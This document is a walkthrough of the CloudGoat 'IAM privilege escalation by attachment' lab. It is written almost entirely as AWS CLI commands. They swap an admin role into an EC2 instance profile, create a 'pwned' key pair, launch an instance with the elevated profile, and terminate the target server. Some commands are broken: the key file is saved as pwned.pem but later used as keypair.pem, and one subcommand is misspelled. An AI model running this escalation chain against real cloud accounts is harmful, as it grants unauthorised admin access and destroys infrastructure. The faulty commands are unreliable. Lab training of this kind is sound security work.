# IAM Privilege Escalation by Attachement

Goal: Delete the EC2 instance "cg-super-critical-security-server."

# Walk Through

## Login 
Login to the user
```
aws configure --profile kerigan
aws sts get-caller-identity --profile kerigan
```
## Identify exisiting ec2 instance role 
```
aws ec2 describe-instances --output json --region us-east-1 --profile kerigan --filters Name=instance-state-name,Values=running


aws iam list-roles --profile kerigan > roles.json

aws iam list-instance-profiles --profile kerigan
Get instance profile name and role to attach to instance profile
```
## Attach admin managed policy on ec2 instance role
```
aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgiddbdjjsvchf --role-name cg-ec2-meek-role-iam_privesc_by_attachment_cgiddbdjjsvchf --profile kerigan

aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgiddbdjjsvchf --role-name cg-ec2-mighty-role-iam_privesc_by_attachment_cgiddbdjjsvchf --profile kerigan
```
## Create a new key pair
```
aws ec2 create-key-pair --key-name pwned --profile kerigan --query 'KeyMaterial' --output text > pwned.pem
chmod 400 keypair.pem

aws ec2 describe-subnets --profile kerigan
aws ec2 descirbe-security-groups --profile kerigan
aws ec2 run-instances --image-id ami-0a313d6098716f372  --instance-type t2.micro --iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgiddbdjjsvchf --key-name pwned --profile kerigan --subnet-id subnet-08b3514ec1dea0381 --security-group-ids sg-01735ee184560070b


ssh -i keypair.pem ubuntu@<ip of instance>

```
## Install aws cli tools and terminate instance of super server
```
sudo apt-get update
sudo apt-get install awscli
aws ec2 describe-instances --region us-east-1 --filters Name=instance-state-name,Values=running

aws ec2 terminate-instances --instance-ids i-03b0e378a59956c35 --region us-east-1
```
## References
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/iam_privesc_by_attachment/README.md